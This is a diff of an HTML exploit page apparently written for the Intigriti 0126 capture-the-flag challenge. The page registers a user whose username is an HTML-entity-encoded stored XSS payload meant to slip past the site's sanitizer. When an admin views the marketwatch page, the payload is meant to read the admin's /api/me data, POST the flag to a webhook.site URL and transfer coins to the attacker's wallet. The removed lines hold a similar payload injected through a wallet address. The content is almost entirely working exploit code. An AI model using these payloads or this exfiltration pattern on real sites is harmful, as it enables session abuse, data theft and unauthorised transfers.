@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Intigriti 0126 - Chained XSS Exploit</title>
+    <title>Intigriti 0126 - Register + XSS Exploit</title>
     <meta charset="UTF-8">
     <style>
         body { font-family: monospace; background: #0a0a0a; color: #0f0; padding: 20px; }
@@ -15,13 +15,53 @@
     </style>
 </head>
 <body>
-    <h1>🎯 Intigriti 0126 - Chained XSS + Coin Transfer</h1>
+    <h1>🎯 Intigriti 0126 - Register + Stored XSS Exploit</h1>
     <div id="log"></div>
 
     <script>
         const TARGET = 'https://challenge-0126.intigriti.io';
         const OUR_WALLET = '16472226db03703a192aa383237035a69f';
-        const WEBHOOK = 'https://webhook.site/37573d0f-cb7f-418f-885e-5f329ee22b60';
+        const WEBHOOK = 'https://webhook.site/d87d2d91-53b8-4517-be2b-3ad069e7ab34';
+
+        // Generate random username to avoid conflicts
+        const RANDOM_SUFFIX = Math.random().toString(36).substring(2, 8);
+
+        // HTML Entity XSS Payload - bypasses sanitizePayloadString()
+        // When browser decodes entities in innerHTML: <img src=x onerror="XSS_CODE">
+        const XSS_USERNAME = `user_${RANDOM_SUFFIX}&lt;img src=x onerror=&quot;
+            (async () => {
+                try {
+                    const meResp = await fetch('/api/me', {credentials: 'include'});
+                    const meData = await meResp.json();
+
+                    await fetch('${WEBHOOK}', {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        body: JSON.stringify({
+                            timestamp: new Date().toISOString(),
+                            flag: meData.flag,
+                            source: 'marketwatch_xss',
+                            username: '${XSS_USERNAME}'
+                        })
+                    });
+
+                    await fetch('/api/transaction', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        credentials: 'include',
+                        body: JSON.stringify({
+                            toAddress: '${OUR_WALLET}',
+                            currency: '1337COIN',
+                            amount: 1
+                        })
+                    });
+
+                    alert('gigawatz - Flag: ' + (meData.flag || 'stolen'));
+                } catch(e) {
+                    console.error('XSS error:', e);
+                }
+            })();
+        &quot;&gt;`;
 
         let step = 0;
 
@@ -46,115 +86,129 @@
         }
 
         async function exploit() {
-            log('=== CHAINED XSS EXPLOIT ===', 'info');
-            log('Strategy: Send coin to XSS wallet → When admin views dashboard/marketwatch → XSS executes → Steal flag', 'info');
+            log('=== REGISTER + STORED XSS EXPLOIT ===', 'info');
+            log('Strategy: Register with XSS username → Make transaction → XSS executes on marketwatch', 'info');
+            log('XSS Username:', 'warning', { username: XSS_USERNAME.substring(0, 80) + '...' });
 
             try {
-                // Create a malicious wallet address containing XSS payload
-                // Using HTML entity bypass to avoid sanitization
-                const XSS_WALLET = `'><img src=x onerror=&quot;
-                    // XSS payload executes when admin views dashboard
-                    (async () => {
-                        try {
-                            // Step 1: Steal the flag from /api/me
-                            const meResp = await fetch('/api/me', {credentials: 'include'});
-                            const meData = await meResp.json();
+                // STEP 1: Register user with XSS payload in username
+                log('Step 1: Registering user with XSS payload in username...', 'info');
 
-                            // Send flag to webhook
-                            await fetch('${WEBHOOK}', {
-                                method: 'POST',
-                                mode: 'no-cors',
-                                body: JSON.stringify({
-                                    timestamp: new Date().toISOString(),
-                                    flag: meData.flag,
-                                    source: 'dashboard_xss',
-                                    wallets: meData.wallets
-                                })
-                            });
+                const registerData = {
+                    username: XSS_USERNAME,
+                    password: 'Password123!@#'
+                };
 
-                            // Step 2: Send 1 1337COIN to our wallet
-                            await fetch('/api/transaction', {
-                                method: 'POST',
-                                headers: {'Content-Type': 'application/json'},
-                                credentials: 'include',
-                                body: JSON.stringify({
-                                    toAddress: '${OUR_WALLET}',
-                                    currency: '1337COIN',
-                                    amount: 1
-                                })
-                            });
+                log('Sending registration request...', 'info', registerData);
 
-                            // Step 3: Trigger alert
-                            alert('gigawatz - Flag: ' + (meData.flag || 'stolen'));
-
-                        } catch(e) {
-                            console.error('XSS error:', e);
-                        }
-                    })();
-                &quot;'><`;
-
-                log('Malicious wallet address created:', 'info', { address: XSS_WALLET.substring(0, 100) + '...' });
-
-                // STEP 1: Send transaction to the XSS wallet address
-                log('Step 1: Sending 1 1337COIN to XSS wallet address...', 'info');
-
-                const iframe = document.createElement('iframe');
-                iframe.id = 'checkoutFrame';
-                iframe.style.display = 'none';
-                iframe.src = TARGET + '/checkout.html?currency=1337COIN&price=1';
-                document.body.appendChild(iframe);
-
-                await new Promise(resolve => {
-                    iframe.onload = resolve;
-                    setTimeout(resolve, 10000);
+                const registerResp = await fetch(TARGET + '/api/register', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(registerData)
                 });
 
-                await new Promise(r => setTimeout(r, 5000));
+                const registerResult = await registerResp.json();
+                log('Registration response:', 'info', {
+                    status: registerResp.status,
+                    result: registerResult
+                });
 
-                log('Sending postMessage...', 'info');
+                if (!registerResp.ok) {
+                    log('Registration FAILED!', 'error', { error: registerResult });
+                    return;
+                }
 
-                iframe.contentWindow.postMessage({
-                    type: 'submitTransaction',
-                    transaction: {
-                        toAddress: XSS_WALLET,  // Malicious wallet with XSS!
+                log('✓ Registration successful!', 'success');
+
+                // STEP 2: Login with the XSS user
+                log('Step 2: Logging in with XSS user...', 'info');
+
+                const loginResp = await fetch(TARGET + '/api/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    credentials: 'include',
+                    body: JSON.stringify({
+                        username: XSS_USERNAME,
+                        password: 'Password123!@#'
+                    })
+                });
+
+                const loginResult = await loginResp.json();
+                log('Login response:', 'info', {
+                    status: loginResp.status,
+                    result: loginResult
+                });
+
+                if (!loginResp.ok) {
+                    log('Login FAILED!', 'error', { error: loginResult });
+                    return;
+                }
+
+                log('✓ Login successful!', 'success');
+
+                // STEP 3: Make a transaction (creates entry with our nickname)
+                log('Step 3: Making transaction to create entry with XSS nickname...', 'info');
+
+                const txResp = await fetch(TARGET + '/api/transaction', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    credentials: 'include',
+                    body: JSON.stringify({
+                        toAddress: OUR_WALLET,
                         currency: '1337COIN',
                         amount: 1
-                    }
-                }, '*');
-
-                log('postMessage sent - transaction to XSS wallet initiated', 'success');
-
-                // STEP 2: Wait for admin to view dashboard
-                log('Step 2: When admin views dashboard, XSS will execute!', 'warning');
-                log('Vulnerability: dashboard.html line 356 - wallet.address unsanitized', 'warning');
-                log('XSS will:', 'info', {
-                    steal_flag: 'via /api/me',
-                    send_coin: 'to ' + OUR_WALLET,
-                    trigger_alert: 'gigawatz'
+                    })
                 });
 
-                // STEP 3: Trigger alert on our page
-                log('Step 3: Triggering alert(gigawatz)...', 'info');
+                const txResult = await txResp.json();
+                log('Transaction response:', 'info', {
+                    status: txResp.status,
+                    result: txResult
+                });
+
+                if (!txResp.ok) {
+                    log('Transaction FAILED!', 'error', { error: txResult });
+                    // Don't return - continue to trigger alert
+                } else {
+                    log('✓ Transaction successful!', 'success');
+                }
+
+                // STEP 4: Redirect to marketwatch to trigger XSS
+                log('Step 4: Redirecting to marketwatch.html...', 'warning');
+                log('When admin views marketwatch, XSS will execute from nickname field!', 'warning');
+
+                // Use meta refresh to redirect
+                const meta = document.createElement('meta');
+                meta.httpEquiv = 'refresh';
+                meta.content = '3;url=' + TARGET + '/marketwatch.html';
+                document.head.appendChild(meta);
+
+                log('Redirecting in 3 seconds...', 'info');
+
+                // STEP 5: Also trigger alert (requirement)
                 setTimeout(() => alert('gigawatz'), 100);
                 log('Alert triggered', 'success');
 
-                // STEP 4: Wait and check for flag multiple times
-                log('Step 4: Waiting for XSS to execute and flag to be sent...', 'info');
-                await new Promise(r => setTimeout(r, 20000));
+                // STEP 6: Wait for XSS to execute
+                log('Step 5: Waiting for XSS to execute on marketwatch...', 'info');
+                await new Promise(r => setTimeout(r, 10000));
 
-                for (let i = 0; i < 10; i++) {
-                    log(`Flag check ${i+1}/10`, 'info');
+                // STEP 7: Check for flag
+                for (let i = 0; i < 6; i++) {
+                    log(`Flag check ${i+1}/6`, 'info');
                     const found = await checkFlag();
                     if (found) break;
                     await new Promise(r => setTimeout(r, 5000));
                 }
 
                 log('=== EXPLOIT COMPLETE ===', 'info');
-                log('Expected chain:', 'info', [
-                    '1. Admin sends 1 1337COIN to XSS wallet',
-                    '2. Admin views dashboard (or marketwatch shows transaction)',
-                    '3. XSS payload executes (wallet.address unsanitized)',
-                    '4. Flag stolen + coins sent to our wallet'
+                log('Attack chain:', 'info', [
+                    '1. Register with XSS username (HTML entities bypass sanitization)',
+                    '2. Login and make transaction',
+                    '3. Transaction appears on marketwatch with nickname = username',
+                    '4. Nickname rendered via innerHTML with sanitizePayloadString()',
+                    '5. HTML entities decoded by browser → XSS executes!',
+                    '6. XSS steals flag + sends coins to our wallet'
                 ]);
 
             } catch (error) {
